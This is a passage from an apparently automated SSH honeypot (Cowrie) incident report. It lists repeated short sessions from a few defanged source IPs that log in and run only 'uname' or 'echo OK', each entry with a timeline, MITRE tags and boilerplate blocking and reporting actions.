**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:27:06` | `cowrie.session.connect` |
| `2026-06-25 19:27:06` | `cowrie.client.version` |
| `2026-06-25 19:27:06` | `cowrie.client.kex` |
| `2026-06-25 19:27:06` | `cowrie.login.success` |
| `2026-06-25 19:27:07` | `cowrie.session.params` |
| `2026-06-25 19:27:07` | `cowrie.command.input` |
| `2026-06-25 19:27:07` | `cowrie.log.closed` |
| `2026-06-25 19:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e74da8c767

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:28 |
| **Last Seen** | 2026-06-25 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:28:04` | `cowrie.session.connect` |
| `2026-06-25 19:28:04` | `cowrie.client.version` |
| `2026-06-25 19:28:04` | `cowrie.client.kex` |
| `2026-06-25 19:28:04` | `cowrie.login.success` |
| `2026-06-25 19:28:05` | `cowrie.session.params` |
| `2026-06-25 19:28:05` | `cowrie.command.input` |
| `2026-06-25 19:28:05` | `cowrie.log.closed` |
| `2026-06-25 19:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eee5e3f94ac

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:29 |
| **Last Seen** | 2026-06-25 19:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:29:02` | `cowrie.session.connect` |
| `2026-06-25 19:29:02` | `cowrie.client.version` |
| `2026-06-25 19:29:02` | `cowrie.client.kex` |
| `2026-06-25 19:29:02` | `cowrie.login.success` |
| `2026-06-25 19:29:03` | `cowrie.session.params` |
| `2026-06-25 19:29:03` | `cowrie.command.input` |
| `2026-06-25 19:29:03` | `cowrie.log.closed` |
| `2026-06-25 19:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9025264feb3a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 19:29 |
| **Last Seen** | 2026-06-25 19:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:29:20` | `cowrie.session.connect` |
| `2026-06-25 19:29:22` | `cowrie.client.version` |
| `2026-06-25 19:29:22` | `cowrie.client.kex` |
| `2026-06-25 19:29:27` | `cowrie.login.success` |
| `2026-06-25 19:29:31` | `cowrie.session.params` |
| `2026-06-25 19:29:31` | `cowrie.command.input` |
| `2026-06-25 19:29:32` | `cowrie.log.closed` |
| `2026-06-25 19:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d59d9875519

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:30 |
| **Last Seen** | 2026-06-25 19:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:30:00` | `cowrie.session.connect` |
| `2026-06-25 19:30:00` | `cowrie.client.version` |
| `2026-06-25 19:30:00` | `cowrie.client.kex` |
| `2026-06-25 19:30:01` | `cowrie.login.success` |
| `2026-06-25 19:30:01` | `cowrie.session.params` |
| `2026-06-25 19:30:01` | `cowrie.command.input` |
| `2026-06-25 19:30:02` | `cowrie.log.closed` |
| `2026-06-25 19:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46fcfa62bc9d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:31 |
| **Last Seen** | 2026-06-25 19:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:31:00` | `cowrie.session.connect` |
| `2026-06-25 19:31:00` | `cowrie.client.version` |
| `2026-06-25 19:31:01` | `cowrie.client.kex` |
| `2026-06-25 19:31:01` | `cowrie.login.success` |
| `2026-06-25 19:31:02` | `cowrie.session.params` |
| `2026-06-25 19:31:02` | `cowrie.command.input` |
| `2026-06-25 19:31:02` | `cowrie.log.closed` |
| `2026-06-25 19:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd2c3c45e683

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:32 |
| **Last Seen** | 2026-06-25 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:32:02` | `cowrie.session.connect` |
| `2026-06-25 19:32:02` | `cowrie.client.version` |
| `2026-06-25 19:32:02` | `cowrie.client.kex` |
| `2026-06-25 19:32:02` | `cowrie.login.success` |
| `2026-06-25 19:32:03` | `cowrie.session.params` |
| `2026-06-25 19:32:03` | `cowrie.command.input` |
| `2026-06-25 19:32:03` | `cowrie.log.closed` |
| `2026-06-25 19:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63f4b089c05d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:33 |
| **Last Seen** | 2026-06-25 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:33:02` | `cowrie.session.connect` |
| `2026-06-25 19:33:02` | `cowrie.client.version` |
| `2026-06-25 19:33:02` | `cowrie.client.kex` |
| `2026-06-25 19:33:03` | `cowrie.login.success` |
| `2026-06-25 19:33:03` | `cowrie.session.params` |
| `2026-06-25 19:33:03` | `cowrie.command.input` |
| `2026-06-25 19:33:03` | `cowrie.log.closed` |
| `2026-06-25 19:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d5c0d7102f4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:34 |
| **Last Seen** | 2026-06-25 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:34:02` | `cowrie.session.connect` |
| `2026-06-25 19:34:02` | `cowrie.client.version` |
| `2026-06-25 19:34:02` | `cowrie.client.kex` |
| `2026-06-25 19:34:02` | `cowrie.login.success` |
| `2026-06-25 19:34:03` | `cowrie.session.params` |
| `2026-06-25 19:34:03` | `cowrie.command.input` |
| `2026-06-25 19:34:03` | `cowrie.log.closed` |
| `2026-06-25 19:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a684820822

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 19:34 |
| **Last Seen** | 2026-06-25 19:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:34:20` | `cowrie.session.connect` |
| `2026-06-25 19:34:20` | `cowrie.client.version` |
| `2026-06-25 19:34:20` | `cowrie.client.kex` |
| `2026-06-25 19:34:22` | `cowrie.login.success` |
| `2026-06-25 19:34:24` | `cowrie.session.params` |
| `2026-06-25 19:34:24` | `cowrie.command.input` |
| `2026-06-25 19:34:24` | `cowrie.log.closed` |
| `2026-06-25 19:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04f9b67e2cc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:35 |
| **Last Seen** | 2026-06-25 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:35:00` | `cowrie.session.connect` |
| `2026-06-25 19:35:00` | `cowrie.client.version` |
| `2026-06-25 19:35:01` | `cowrie.client.kex` |
| `2026-06-25 19:35:01` | `cowrie.login.success` |
| `2026-06-25 19:35:02` | `cowrie.session.params` |
| `2026-06-25 19:35:02` | `cowrie.command.input` |
| `2026-06-25 19:35:02` | `cowrie.log.closed` |
| `2026-06-25 19:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72542a875de

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:36 |
| **Last Seen** | 2026-06-25 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:36:00` | `cowrie.session.connect` |
| `2026-06-25 19:36:00` | `cowrie.client.version` |
| `2026-06-25 19:36:00` | `cowrie.client.kex` |
| `2026-06-25 19:36:00` | `cowrie.login.success` |
| `2026-06-25 19:36:01` | `cowrie.session.params` |
| `2026-06-25 19:36:01` | `cowrie.command.input` |
| `2026-06-25 19:36:01` | `cowrie.log.closed` |
| `2026-06-25 19:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12579a5fbec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:37 |
| **Last Seen** | 2026-06-25 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:37:00` | `cowrie.session.connect` |
| `2026-06-25 19:37:00` | `cowrie.client.version` |
| `2026-06-25 19:37:00` | `cowrie.client.kex` |
| `2026-06-25 19:37:01` | `cowrie.login.success` |
| `2026-06-25 19:37:01` | `cowrie.session.params` |
| `2026-06-25 19:37:01` | `cowrie.command.input` |
| `2026-06-25 19:37:01` | `cowrie.log.closed` |
| `2026-06-25 19:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e4d2b19275

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:38 |
| **Last Seen** | 2026-06-25 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:38:01` | `cowrie.session.connect` |
| `2026-06-25 19:38:01` | `cowrie.client.version` |
| `2026-06-25 19:38:01` | `cowrie.client.kex` |
| `2026-06-25 19:38:02` | `cowrie.login.success` |
| `2026-06-25 19:38:03` | `cowrie.session.params` |
| `2026-06-25 19:38:03` | `cowrie.command.input` |
| `2026-06-25 19:38:03` | `cowrie.log.closed` |
| `2026-06-25 19:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f1bc70f495

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:39 |
| **Last Seen** | 2026-06-25 19:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:39:03` | `cowrie.session.connect` |
| `2026-06-25 19:39:03` | `cowrie.client.version` |
| `2026-06-25 19:39:03` | `cowrie.client.kex` |
| `2026-06-25 19:39:03` | `cowrie.login.success` |
| `2026-06-25 19:39:04` | `cowrie.session.params` |
| `2026-06-25 19:39:04` | `cowrie.command.input` |
| `2026-06-25 19:39:04` | `cowrie.log.closed` |
| `2026-06-25 19:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4c2acfab6b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:40 |
| **Last Seen** | 2026-06-25 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:40:04` | `cowrie.session.connect` |
| `2026-06-25 19:40:04` | `cowrie.client.version` |
| `2026-06-25 19:40:04` | `cowrie.client.kex` |
| `2026-06-25 19:40:04` | `cowrie.login.success` |
| `2026-06-25 19:40:05` | `cowrie.session.params` |
| `2026-06-25 19:40:05` | `cowrie.command.input` |
| `2026-06-25 19:40:05` | `cowrie.log.closed` |
| `2026-06-25 19:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e3eaa6432a8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 19:40 |
| **Last Seen** | 2026-06-25 19:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:40:47` | `cowrie.session.connect` |
| `2026-06-25 19:40:49` | `cowrie.client.version` |
| `2026-06-25 19:40:49` | `cowrie.client.kex` |
| `2026-06-25 19:40:55` | `cowrie.login.success` |
| `2026-06-25 19:40:59` | `cowrie.session.params` |
| `2026-06-25 19:40:59` | `cowrie.command.input` |
| `2026-06-25 19:41:00` | `cowrie.log.closed` |
| `2026-06-25 19:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d679cb29e8d7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:41 |
| **Last Seen** | 2026-06-25 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:41:04` | `cowrie.session.connect` |
| `2026-06-25 19:41:04` | `cowrie.client.version` |
| `2026-06-25 19:41:05` | `cowrie.client.kex` |
| `2026-06-25 19:41:05` | `cowrie.login.success` |
| `2026-06-25 19:41:06` | `cowrie.session.params` |
| `2026-06-25 19:41:06` | `cowrie.command.input` |
| `2026-06-25 19:41:06` | `cowrie.log.closed` |
| `2026-06-25 19:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d805bbf4ed

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:42 |
| **Last Seen** | 2026-06-25 19:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:42:06` | `cowrie.session.connect` |
| `2026-06-25 19:42:06` | `cowrie.client.version` |
| `2026-06-25 19:42:06` | `cowrie.client.kex` |
| `2026-06-25 19:42:07` | `cowrie.login.success` |
| `2026-06-25 19:42:07` | `cowrie.session.params` |
| `2026-06-25 19:42:07` | `cowrie.command.input` |
| `2026-06-25 19:42:07` | `cowrie.log.closed` |
| `2026-06-25 19:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed43afde178

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:43 |
| **Last Seen** | 2026-06-25 19:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:43:09` | `cowrie.session.connect` |
| `2026-06-25 19:43:09` | `cowrie.client.version` |
| `2026-06-25 19:43:09` | `cowrie.client.kex` |
| `2026-06-25 19:43:09` | `cowrie.login.success` |
| `2026-06-25 19:43:10` | `cowrie.session.params` |
| `2026-06-25 19:43:10` | `cowrie.command.input` |
| `2026-06-25 19:43:10` | `cowrie.log.closed` |
| `2026-06-25 19:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a0afa31ca45

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:44 |
| **Last Seen** | 2026-06-25 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:44:13` | `cowrie.session.connect` |
| `2026-06-25 19:44:13` | `cowrie.client.version` |
| `2026-06-25 19:44:14` | `cowrie.client.kex` |
| `2026-06-25 19:44:14` | `cowrie.login.success` |
| `2026-06-25 19:44:15` | `cowrie.session.params` |
| `2026-06-25 19:44:15` | `cowrie.command.input` |
| `2026-06-25 19:44:15` | `cowrie.log.closed` |
| `2026-06-25 19:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858c424d6134

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:45 |
| **Last Seen** | 2026-06-25 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:45:17` | `cowrie.session.connect` |
| `2026-06-25 19:45:17` | `cowrie.client.version` |
| `2026-06-25 19:45:17` | `cowrie.client.kex` |
| `2026-06-25 19:45:18` | `cowrie.login.success` |
| `2026-06-25 19:45:18` | `cowrie.session.params` |
| `2026-06-25 19:45:18` | `cowrie.command.input` |
| `2026-06-25 19:45:19` | `cowrie.log.closed` |
| `2026-06-25 19:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00ca82ca8fab

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:46 |
| **Last Seen** | 2026-06-25 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:46:20` | `cowrie.session.connect` |
| `2026-06-25 19:46:20` | `cowrie.client.version` |
| `2026-06-25 19:46:21` | `cowrie.client.kex` |
| `2026-06-25 19:46:21` | `cowrie.login.success` |
| `2026-06-25 19:46:22` | `cowrie.session.params` |
| `2026-06-25 19:46:22` | `cowrie.command.input` |
| `2026-06-25 19:46:22` | `cowrie.log.closed` |
| `2026-06-25 19:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99e9354b9f2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:47 |
| **Last Seen** | 2026-06-25 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:47:22` | `cowrie.session.connect` |
| `2026-06-25 19:47:22` | `cowrie.client.version` |
| `2026-06-25 19:47:22` | `cowrie.client.kex` |
| `2026-06-25 19:47:23` | `cowrie.login.success` |
| `2026-06-25 19:47:23` | `cowrie.session.params` |
| `2026-06-25 19:47:23` | `cowrie.command.input` |
| `2026-06-25 19:47:23` | `cowrie.log.closed` |
| `2026-06-25 19:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d515fb7471

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:48 |
| **Last Seen** | 2026-06-25 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:48:25` | `cowrie.session.connect` |
| `2026-06-25 19:48:25` | `cowrie.client.version` |
| `2026-06-25 19:48:25` | `cowrie.client.kex` |
| `2026-06-25 19:48:25` | `cowrie.login.success` |
| `2026-06-25 19:48:26` | `cowrie.session.params` |
| `2026-06-25 19:48:26` | `cowrie.command.input` |
| `2026-06-25 19:48:26` | `cowrie.log.closed` |
| `2026-06-25 19:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c15316cc89

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 19:48 |
| **Last Seen** | 2026-06-25 19:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:48:57` | `cowrie.session.connect` |
| `2026-06-25 19:48:57` | `cowrie.client.version` |
| `2026-06-25 19:48:57` | `cowrie.client.kex` |
| `2026-06-25 19:48:59` | `cowrie.login.success` |
| `2026-06-25 19:49:01` | `cowrie.session.params` |
| `2026-06-25 19:49:01` | `cowrie.command.input` |
| `2026-06-25 19:49:01` | `cowrie.log.closed` |
| `2026-06-25 19:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16b9ec2a3af4

| Field | Detail |
|---|---|
